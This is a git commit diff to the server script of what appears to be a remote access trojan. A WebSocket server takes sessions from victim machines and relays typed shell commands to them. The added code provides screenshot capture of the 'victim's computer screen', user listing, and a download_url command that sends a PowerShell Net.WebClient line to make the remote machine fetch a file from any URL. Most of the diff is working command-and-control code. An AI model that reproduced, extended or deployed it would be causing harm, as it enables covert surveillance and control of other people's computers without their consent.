686767d8c8650fecbb82fbda9943390c0f4d0ced
Antoine Raulin <25278917+antoineraulin@users.noreply.github.com>
2018-10-03 16:00:25 +0200

    update server.js

--- Server/server.js
+++ Server/server.js
@@ -1,20 +1,20 @@
 const WebSocket = require('ws');
 const colors = require('colors');
-var keypress = require('keypress');
-keypress(process.stdin);
-var pos = 1;
-var cursorPos = 0;
-const cliCursor = require('cli-cursor');
 require('events').EventEmitter.setMaxListeners = 1;
 var workingDir = "";
-process.stdin.setRawMode(true);
-process.stdin.resume();
-cmdHistory = [""];
 sessions = [];
 currentSession = 0;
 const wss = new WebSocket.Server({
 	port: 4422
 });
+const readline = require('readline');
+const rl = readline.createInterface({
+	input: process.stdin,
+	output: process.stdout,
+	completer: suggestions,
+	historySize: 60
+});
+
 
 wss.on('connection', function connection(ws) {
 	sessions.push(ws);
@@ -24,7 +24,8 @@ wss.on('connection', function connection(ws) {
 
 		if (message.startsWith("hello")) {
 			workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
-			process.stdout.write(workingDir.bold.white + "> ".white);
+			rl.setPrompt(workingDir + "> ");
+			rl.prompt();
 		} else if (message.startsWith("##finish##")) {
 			ws.send("#pwd");
 		} else if (message.startsWith("##SCREENSHOT##")) {
@@ -40,115 +41,59 @@ wss.on('connection', function connection(ws) {
 
 });
 
-process.stdin.on("keypress", function (ch, key) {
-	if (key && key.name == "up") {
-		if (pos + 1 <= cmdHistory.length) {
-			pos++;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
-		}
-	} else if (key && key.name == "down") {
-		if (pos - 1 > 0) {
-			pos--;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
-		}
-	} else if (key && key.name == "left") {
-		try{
-		if (cursorPos - 1 >= 0) {
-			cliCursor.hide();
-			cursorPos = cursorPos - 1;
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
-		}}catch(e){}
-	} else if (key && key.name == "right") {
-		try{
-		if (cursorPos + 1 < cmdHistory[cmdHistory.length - pos].length - 1) {
-			cursorPos = cursorPos + 1;
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
+function suggestions(line) {
+	const completions = 'win_help help list_users screenshot download_url dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const hits = completions.filter((c) => c.startsWith(line));
+	return [hits.length ? hits : completions, line];
+}
 
-		} else {
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cliCursor.show();
-			cursorPos = cursorPos + 1;
+rl.on('line', (line) => {
+	var msg = line.trim();
+	if (msg == "screenshot") {
+		console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
+		sessions[currentSession].send(msg);
+	} else if (msg.startsWith("download_url")) {
+		if (msg.split(" ").length == 4) {
+			var string = msg.split(" ");
+			var url = string[1];
+			var filename = string[2];
+			var path = string[3];
+			if(ValidURL(url)){
+				console.log("[".white + "+".blue + "]".white + "Download request sent ! Please wait while downloading...".bold);
+				sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
+			}else{
+				console.log("[".white + "+".red + "]".white + " Wrong URL !");
+				rl.prompt();
+			}
 		}
-	}catch(e){}
-	} else if (key && key.name == "backspace") {
-		try{
-		if (cursorPos != cmdHistory[cmdHistory.length - pos].length - 1) {
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos, cmdHistory[cmdHistory.length - pos.length - 1]);
-			before = before.slice(0, -1);
-			cmdHistory[cmdHistory.length - pos] = before + after;
-			cursorPos = cursorPos - 1;
-			before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
-		} else {
-			cmdHistory[cmdHistory.length - pos] = cmdHistory[cmdHistory.length - pos].substring(0, cmdHistory[cmdHistory.length - pos].length - 1);
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
-		}}catch(e){}
-	} else if (key && key.ctrl && key.name == 'c') {
-		process.exit()
-	} else if (key && key.name == "return") {
-		process.stdout.clearLine();
-		process.stdout.cursorTo(0);
-		process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos] + "\n");
-		sessions[currentSession].send(cmdHistory[cmdHistory.length - pos]);
-		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
-			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
-		}
-		if (pos == 1) cmdHistory[cmdHistory.length] = "";
-		pos = 1;
-		cursorPos = 0;
-	} else {
-		if (cursorPos == cmdHistory[cmdHistory.length - pos].length - 1 || (cursorPos == 0 && cmdHistory[cmdHistory.length - pos] == 0)) {
-			if (key != undefined) cmdHistory[cmdHistory.length - pos] += key.sequence;
-			else cmdHistory[cmdHistory.length - pos] += ch;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
-		} else {
-			var add = "";
-			if (key != undefined) add = key.sequence;
-			else add = ch;
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos, cmdHistory[cmdHistory.length - pos.length - 1]);
-			before += add;
-			cmdHistory[cmdHistory.length - pos] = before + after;
-			cursorPos = cursorPos + 1;
-			before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
-		}
+	}else if(msg == "list_users"){
+		sessions[currentSession].send("cd /Users & dir");
+	}else if(msg == "help"){
+		console.log(cmdList.join("\n"));
+		rl.prompt();
+	}else if(msg == "win_help"){
+		sessions[currentSession].send("help");
+	}else{
+		sessions[currentSession].send(msg);
 	}
+}).on('close', () => {
+	console.log('Have a great day! A3 over.');
+	process.exit(0);
 });
+
+function ValidURL(str) {
+	var pattern = new RegExp('^(https?:\/\/)?'+ // protocol
+	  '((([a-z\d]([a-z\d-]*[a-z\d])*)\.)+[a-z]{2,}|'+ // domain name
+	  '((\d{1,3}\.){3}\d{1,3}))'+ // OR ip (v4) address
+	  '(\:\d+)?(\/[-a-z\d%_.~+]*)*'+ // port and path
+	  '(\?[;&a-z\d%_.~+=-]*)?'+ // query string
+	  '(\#[-a-z\d_]*)?$','i'); // fragment locater
+	if(!pattern.test(str)) {
+	  alert("Please enter a valid URL.");
+	  return false;
+	} else {
+	  return true;
+	}
+  }
+
+var cmdList = ["help => show this message. Usage : help <command name[optional]>","screenshot => take screenshot of victim's computer screen. Screenshots are located in screeshots/ folder."];
